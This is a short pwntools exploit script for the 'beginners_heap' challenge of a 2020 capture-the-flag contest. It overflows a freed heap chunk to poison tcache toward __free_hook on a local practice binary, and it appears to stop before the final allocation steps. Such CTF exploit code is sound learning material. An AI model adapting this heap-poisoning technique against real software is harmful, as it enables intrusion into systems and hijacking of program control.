# -*- coding: utf-8 -*-
#wah
from pwn import *
elf_file = FILENAME = '/home/k1zuna/D/2020/Beginners_CTF_2020/pwn/beginners_heap/build/chall'
elf = context.binary = ELF(elf_file)


HOST = 'localhost'
POST = 9002
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
c = remote(HOST, POST)

def _read(data):
  c.sendlineafter("> ", "1")
  c.send(data)
  sleep(0.1)

def _malloc(data):
  c.sendlineafter("> ", "2")
  c.send(data)
  sleep(0.1)

def _free():
  c.sendlineafter("> ", "3")
  sleep(0.1)

pad = 0x18

c.recvuntil('<__free_hook>: ')
free_hook = int(c.recvline().rstrip(),16)
print(hex(free_hook))
c.recvuntil(' <win>: ')
win = int(c.recvline().rstrip(),16)
print(hex(win))

_malloc('hello')

_free()

payload = 'A' * (0x18)
payload += p64(0x30)
payload += p64(free_hook)

_read(payload)
c.interactive()